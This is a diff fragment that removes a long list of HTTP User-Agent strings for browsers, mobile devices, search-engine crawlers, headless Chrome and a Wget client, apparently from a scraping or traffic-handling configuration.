-  "Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900T Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36",
-
-  "Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G920P Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.2 Chrome/38.0.2125.102 Mobile Safari/537.36",
-
-  "Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G920T Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.2 Chrome/38.0.2125.102 Mobile Safari/537.36",
-
-  "Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-N910P Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36",
-
-  "Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; LG-V410/V41010d Build/KOT49I.V41010d) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.1599.103 Safari/537.36",
-
-  "Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFARWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",
-
-  "Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFSAWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",
-
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:34.0) Gecko/20100101 Firefox/34.0",
-
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:36.0) Gecko/20100101 Firefox/36.0",
-
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36",
-
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36",
-
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
-
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36",
-
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
-
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/8.0.6 Safari/600.6.3",
-
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.107 Safari/537.36",
-
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36 OPR/31.0.1889.174",
-
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2503.0 Safari/537.36",
-
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko)",
-
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56",
-
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36",
-
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36",
-
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",
-
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
-
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/7.1.6 Safari/537.85.15",
-
-  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; Trident/7.0; rv:11.0) like Gecko",
-
-  "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; MAARJS; rv:11.0) like Gecko",
-
-  "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; MALNJS; rv:11.0) like Gecko",
-
-  "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; MDDCJS; rv:11.0) like Gecko",
-
-  "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36 LBBROWSER",
-
-  "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 6.0; rv:38.0) Gecko/20100101 Firefox/38.0",
-
-  "Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.94 AOL/9.7 AOLBuild/4343.4049.US Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 6.0; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0",
-
-  "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 6.1; rv:28.0) Gecko/20100101 Firefox/28.0",
-
-  "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0",
-
-  "Mozilla/5.0 (Windows NT 6.1; rv:36.0) Gecko/20100101 Firefox/36.0",
-
-  "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.13 Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.101 Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.146 Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.94 AOL/9.7 AOLBuild/4343.4043.US Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.101 Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36 SE 2.X MetaSr 1.0",
-
-  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.154 Safari/537.36 LBBROWSER",
-
-  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.132 Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.6.1000 Chrome/30.0.1599.101 Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0",
-
-  "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0",
-
-  "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; ASJB; ASJB; MAAU; rv:11.0) like Gecko",
-
-  "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; BOIE9;ENUSSEM; rv:11.0) like Gecko",
-
-  "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; MDDRJS; rv:11.0) like Gecko",
-
-  "Mozilla/5.0 (Windows NT 6.2; Win64; x64; Trident/7.0; rv:11.0) like Gecko",
-
-  "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0",
-
-  "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0",
-
-  "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; Touch; TNJB; rv:11.0) like Gecko",
-
-  "Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; MALNJS; rv:11.0) like Gecko",
-
-  "Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; MAARJS; rv:11.0) like Gecko",
-
-  "Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; MASMJS; rv:11.0) like Gecko",
-
-  "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.104 Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.6.2000 Chrome/30.0.1599.101 Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; MAARJS; rv:11.0) like Gecko",
-
-  "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko",
-
-  "Mozilla/5.0 (Windows; U; Windows NT 6.1; zh-CN; rv:1.9.0.8) Gecko/2009032609 Firefox/3.0.8 (.NET CLR 3.5.30729)",
-
-  "Mozilla/5.0 (X11; CrOS x86_64 6457.107.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36",
-
-  "Mozilla/5.0 (X11; CrOS x86_64 7077.95.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.90 Safari/537.36",
-
-  "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0",
-
-  "Mozilla/5.0 (X11; Linux i686; rv:40.0) Gecko/20100101 Firefox/40.0",
-
-  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/33.0.0.0 Safari/534.24",
-
-  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.76 Safari/537.36",
-
-  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.102 Safari/537.36",
-
-  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36",
-
-  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36",
-
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.2",
-
-  "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; en-en) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4",
-
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.8",
-
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.59.10 (KHTML, like Gecko) Version/5.1.9 Safari/534.59.10",
-
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/E7FBAF",
-
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0",
-
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.8 (KHTML, like Gecko)",
-
-  "Mac OS X/10.6.8 (10K549); ExchangeWebServices/1.3 (61); Mail/4.6 (1085)",
-
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7",
-
-  "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_4; de-de) AppleWebKit/525.18 (KHTML, like Gecko) Version/3.1.2 Safari/525.20.1",
-
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko)",
-
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/601.7.8 (KHTML, like Gecko) Version/9.1.3 Safari/537.86.7",
-
-  "MacOutlook/0.0.0.150815 (Intel Mac OS X Version 10.10.5 (Build 14F27))",
-
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:28.0) Gecko/20100101 Firefox/28.0",
-
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:34.0) Gecko/20100101 Firefox/34.0",
-
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:46.0) Gecko/20100101 Firefox/46.0",
-
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:44.0) Gecko/20100101 Firefox/44.0",
-
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:51.0) Gecko/20100101 Firefox/51.0",
-
-  "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.4; en-US; rv:1.9.0.5) Gecko/2008120121 Firefox/3.0.5",
-
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36",
-
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:52.0) Gecko/20100101 Firefox/52.0",
-
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36",
-
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:38.0) Gecko/20100101 Firefox/38.0",
-
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36",
-
-  "Mozilla/5.0 CK={} (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
-
-  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36",
-
-  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)",
-
-  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)",
-
-  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
-
-  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134",
-
-  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763",
-
-  "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; KTXN)",
-
-  "Mozilla/5.0 (Windows NT 5.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1",
-
-  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
-
-  "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
-
-  "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1",
-
-  "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36",
-
-  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)",
-
-  "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
-
-  "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0",
-
-  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
-
-  "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
-
-  "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 125LA; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)",
-
-  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)",
-
-  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18362",
-
-  "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko",
-
-  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",
-
-  "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.83 Safari/537.1",
-
-  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
-
-  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36",
-
-  "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)",
-
-  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18363",
-
-  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36 Edg/87.0.664.75",
-
-  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36",
-
-  "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)",
-
-  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063",
-
-  "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko",
-
-  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 5.1; rv:36.0) Gecko/20100101 Firefox/36.0",
-
-  "Mozilla/5.0 (Windows NT 5.1; rv:11.0) Gecko Firefox/11.0 (via ggpht.com GoogleImageProxy)",
-
-  "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
-
-  "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
-
-  "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
-
-  "Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)",
-
-  "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
-
-  "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
-
-  "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
-
-  "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.8.1) VoilaBot BETA 1.2 (support.voilabot@orange-ftgroup.com)",
-
-  "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://aspiegel.com/petalbot)",
-
-  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon",
-
-  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
-
-  "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:24.0) Gecko/20100101 Firefox/24.0",
-
-  "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.5) Gecko/20041107 Firefox/1.0",
-
-  "Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0",
-
-  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/71.0.3578.141 Safari/534.24 XiaoMi/MiuiBrowser/12.4.3-g",
-
-  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/69.0.3497.81 Safari/537.36",
-
-  "Mozilla/5.0 (X11; Linux x86_64; rv:12.0) Gecko/20100101 Firefox/12.0",
-
-  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36",
-
-  "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.1) Gecko/20060124 Firefox/1.5.0.1",
-
-  "Mozilla/5.0 (X11; Linux x86_64; rv:67.0) Gecko/20100101 Firefox/67.0",
-
-  "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/53.0.2785.143 Chrome/53.0.2785.143 Safari/537.36",
-
-  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Safari/537.36",
-
-  "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:46.0) Gecko/20100101 Firefox/46.0",
-
-  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/80.0.3987.87 Chrome/80.0.3987.87 Safari/537.36",
-
-  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.109 Safari/537.36",
-
-  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.109 Safari/537.36",
-
-  "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.120 Chrome/37.0.2062.120 Safari/537.36",
-
-  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36",
-
-  "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:53.0) Gecko/20100101 Firefox/53.0",
-
-  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/76.0.3809.100 Chrome/76.0.3809.100 Safari/537.36",
-
-  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/49.0.2623.108 Chrome/49.0.2623.108 Safari/537.36",
-
-  "Wget/1.17.1 (linux-gnu)",
-
-  "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:44.0) Gecko/20100101 Firefox/44.0",
-
-  "Mozilla/5.0 (X11; Linux x86_64; rv:33.0) Gecko/20100101 Firefox/33.0",
-
-  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36",
-
-  "Mozilla/5.0 (X11; Linux x86_64; rv:41.0) Gecko/20100101 Firefox/41.0",
-
-  "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:10.0) Gecko/20100101 Firefox/10.0",
-
-  "Mozilla/5.0 (X11; Linux x86_64; rv:37.0) Gecko/20100101 Firefox/37.0",
-
-  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.0 Safari/537.36",
-
-  "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:59.0) Gecko/20100101 Firefox/59.0",
-
-  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36",
-
-  "Mozilla/5.0 (SMART-TV; Linux; Tizen 5.0) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.2 Chrome/63.0.3239.84 TV Safari/537.36",
-
-  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/70.0.3538.77 Chrome/70.0.3538.77 Safari/537.36",
-
-  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36",
-
-  "Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3",
-
-  "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.172 Safari/537.22",
-
-  "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:63.0) Gecko/20100101 Firefox/63.0",
-
